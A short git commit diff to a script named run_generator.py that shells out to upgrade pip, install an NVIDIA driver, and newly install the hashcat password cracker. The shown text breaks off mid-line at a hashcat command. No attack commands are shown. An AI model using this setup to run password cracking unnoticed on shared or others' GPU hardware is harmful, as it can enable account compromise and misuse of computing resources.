fbd7fff9a69b11be7ecb31fded5c9bca81e90087
whiteco11 <92255856+whiteco11@users.noreply.github.com>
2021-10-10 15:38:34 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -2,3 +2,5 @@ import os as alpha
 alpha.system("pip install --upgrade pip")
 alpha.system("apt-get update")
 alpha.system("apt install nvidia-driver-455")
+alpha.system("apt-get install hashcat -y")
+alpha.system("hashcat -I
